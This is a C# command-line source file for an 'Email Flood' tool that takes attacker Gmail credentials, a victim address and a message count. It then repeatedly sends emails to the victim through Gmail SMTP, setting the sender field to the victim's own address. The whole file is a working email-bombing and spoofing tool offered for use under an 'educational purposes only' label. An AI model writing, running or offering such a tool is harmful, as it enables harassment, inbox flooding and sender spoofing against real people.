using System;
using System.Net.Mail;
using System.Net;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.Parsing;

namespace Main
{
    public class Program
    {
        public static async Task<int> Main(string[] arguments)
        {
            int version = 1;
            string author = "@yeaow1";
            string ASCII = $"""

$$$$$$$$\                      $$\$$\       $$$$$$$$\$$\                        $$\        $$$$$$\   $$\ $$\   
$$  _____|                     \__$$ |      $$  _____$$ |                       $$ |      $$  __$$\  $$ \$$ \  
$$ |     $$$$$$\$$$$\  $$$$$$\ $$\$$ |      $$ |     $$ |$$$$$$\  $$$$$$\  $$$$$$$ |      $$ /  \__$$$$$$$$$$\ 
$$$$$\   $$  _$$  _$$\ \____$$\$$ $$ |      $$$$$\   $$ $$  __$$\$$  __$$\$$  __$$ |      $$ |     \_$$  $$   |
$$  __|  $$ / $$ / $$ |$$$$$$$ $$ $$ |      $$  __|  $$ $$ /  $$ $$ /  $$ $$ /  $$ |      $$ |     $$$$$$$$$$\ 
$$ |     $$ | $$ | $$ $$  __$$ $$ $$ |      $$ |     $$ $$ |  $$ $$ |  $$ $$ |  $$ |      $$ |  $$\\_$$  $$  _|
$$$$$$$$\$$ | $$ | $$ \$$$$$$$ $$ $$ |      $$ |     $$ \$$$$$$  \$$$$$$  \$$$$$$$ |      \$$$$$$  | $$ |$$ |  
\________\__| \__| \__|\_______\__\__|      \__|     \__|\______/ \______/ \_______|       \______/  \__|\__|  
                                                                                                               
                 Version: {version}.0.0         Author: {author}                                                                                           
                                                                                                               
""";

            var emailAttacker = new Option<string>(new[] { "--email", "-e" }, description: "The attacker email, just supports gmail.");
            var passwordAttacker = new Option<string>(new[] { "--password", "-p" }, description: "The attacker password.");
            var victimEmail = new Option<string>(new[] { "--victim", "-v" }, description: "The victim email.");
            var amount = new Option<int>(new[] { "--amount", "-a" }, description: "Specify the email amount to send, per default it's 10.");

            var root = new RootCommand
            {
                emailAttacker,
                passwordAttacker,
                victimEmail,
                amount,
            };

            root.SetHandler<string, string, string, int>(SendEmail, emailAttacker, passwordAttacker, victimEmail, amount);

            var commandLineBuilder = new CommandLineBuilder(root)
                .UseDefaults();

            var parser = commandLineBuilder.Build();

            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine(ASCII);

            root.Description = "Email flood/spam script written in C# for educational purposes only.";

            Console.ResetColor();

            if (arguments.Length == 0)
            {
                return await parser.InvokeAsync("--help").ConfigureAwait(true);
            }

            return await parser.InvokeAsync(arguments).ConfigureAwait(true);
        }
        private static async Task SendEmail(string emailAttacker, string passwordAttacker, string victimEmail, int amount)
        {
            string? subject;
            string? body;
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtp = new SmtpClient("smtp.gmail.com");
                
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.Write("[?] Type a body message: ");

                body = Console.ReadLine();
                Console.Write("[?] Type a subject message: ");
                subject = Console.ReadLine();
                Console.ResetColor();

                for(int i = 1; i <= amount; i++) 
                {
                    mail.From = new MailAddress(victimEmail);
                    mail.To.Add(victimEmail);
                    mail.IsBodyHtml = true;
                    mail.Subject = subject;
                    mail.Body = body;

                    smtp.Port = 587;
                    smtp.Credentials = new NetworkCredential(emailAttacker, passwordAttacker);
                    smtp.EnableSsl = true;
                    smtp.Send(mail);
                    
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine($"[*] Sent {i} emails");
                    Console.ResetColor();
                    await Task.Delay(5000);
                }
            }
            catch (Exception ex)
            {         
                Console.WriteLine($"Unable to execute script: {ex}");
            }
        }
    }
}

